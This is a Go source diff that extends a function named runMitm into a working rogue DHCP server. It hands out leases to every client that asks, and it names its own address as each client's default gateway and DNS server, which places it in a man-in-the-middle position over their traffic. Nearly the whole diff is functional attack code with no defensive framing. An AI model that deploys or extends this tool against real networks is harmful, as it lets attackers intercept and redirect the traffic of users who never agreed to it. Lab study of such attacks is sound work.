@@ -1,9 +1,17 @@
 package main
 
 import (
+	"encoding/binary"
 	"fmt"
 	"net"
 	"syscall"
+)
+
+const (
+	dhcpServerIP  = "10.0.0.1"
+	dhcpPoolStart = "10.0.0.100"
+	dhcpSubnet    = "255.255.255.0"
+	dhcpLeaseSecs = 3600
 )
 
 func runMitm() error {
@@ -19,6 +27,15 @@ func runMitm() error {
 	})
 	fmt.Println("Listening for DHCP packets on UDP port 67...")
 
+	serverIP := net.ParseIP(dhcpServerIP).To4()
+	subnetMask := net.ParseIP(dhcpSubnet).To4()
+	leaseTime := make([]byte, 4)
+	binary.BigEndian.PutUint32(leaseTime, dhcpLeaseSecs)
+	broadcast := &net.UDPAddr{IP: net.IPv4bcast, Port: 68}
+
+	leases := map[string]net.IP{}
+	nextIP := net.ParseIP(dhcpPoolStart).To4()
+
 	buf := make([]byte, 1500)
 	for {
 		n, addr, err := conn.ReadFrom(buf)
@@ -33,7 +50,56 @@ func runMitm() error {
 			continue
 		}
 		fmt.Printf("Received %d bytes from %s\n%s", n, addr, pkt)
-	}
 
-	return nil
+		msgType, ok := pkt.MessageType()
+		if !ok {
+			continue
+		}
+
+		mac := pkt.CHAddr.String()
+		var reply *DHCPPacket
+
+		switch msgType {
+		case DHCPDiscover:
+			ip, seen := leases[mac]
+			if !seen {
+				ip = append(net.IP(nil), nextIP...)
+				leases[mac] = ip
+				incIP(nextIP)
+			}
+			reply = NewReply(pkt, DHCPOffer, ip)
+
+		case DHCPRequest:
+			ip, seen := leases[mac]
+			if !seen {
+				continue // never offered this client anything; ignore
+			}
+			reply = NewReply(pkt, DHCPAck, ip)
+
+		default:
+			continue
+		}
+
+		reply.SIAddr = serverIP
+		reply.SetOption(OptServerID, serverIP)
+		reply.SetOption(OptSubnetMask, subnetMask)
+		reply.SetOption(OptRouter, serverIP)
+		reply.SetOption(OptDNSServer, serverIP)
+		reply.SetOption(OptLeaseTime, leaseTime)
+
+		if _, err := conn.WriteTo(reply.Marshal(), broadcast); err != nil {
+			fmt.Printf("send error: %v\n", err)
+		}
+	}
+}
+
+// incIP increments a 4-byte IPv4 address in place (with carry), used to hand
+// out sequential addresses from the pool.
+func incIP(ip net.IP) {
+	for i := len(ip) - 1; i >= 0; i-- {
+		ip[i]++
+		if ip[i] != 0 {
+			break
+		}
+	}
 }
